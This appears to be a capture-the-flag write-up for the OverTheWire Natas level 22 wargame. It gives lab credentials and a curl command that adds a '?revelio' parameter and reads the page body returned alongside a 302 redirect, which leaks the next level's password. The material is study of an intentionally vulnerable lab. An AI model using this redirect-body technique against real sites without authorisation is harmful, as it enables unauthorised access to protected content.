# Natas22

*	user: `natas22`
*	pass: `chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ`
*	url: [http://natas22.natas.labs.overthewire.org](http://natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ@natas22.natas.labs.overthewire.org)
*	flag: `D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE`

## Procedure

1.	Probably one of the simplest levels

		$ curl -i -XGET -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/?revelio
		HTTP/1.1 302 Found
		Date: Fri, 10 Apr 2015 19:01:45 GMT
		Server: Apache/2.4.7 (Ubuntu)
		X-Powered-By: PHP/5.5.9-1ubuntu4.7
		Set-Cookie: PHPSESSID=90gd0gl4m2jg8p1p31hfd2ma77; path=/; HttpOnly
		Expires: Thu, 19 Nov 1981 08:52:00 GMT
		Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
		Pragma: no-cache
		Location: /
		Content-Length: 1049
		Content-Type: text/html

		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas22", "pass": "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ" };</script></head>
		<body>
		<h1>natas22</h1>
		<div id="content">

		You are an admin. The credentials for the next level are:<br><pre>Username: natas23
		Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
		<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		</body>
		</html>

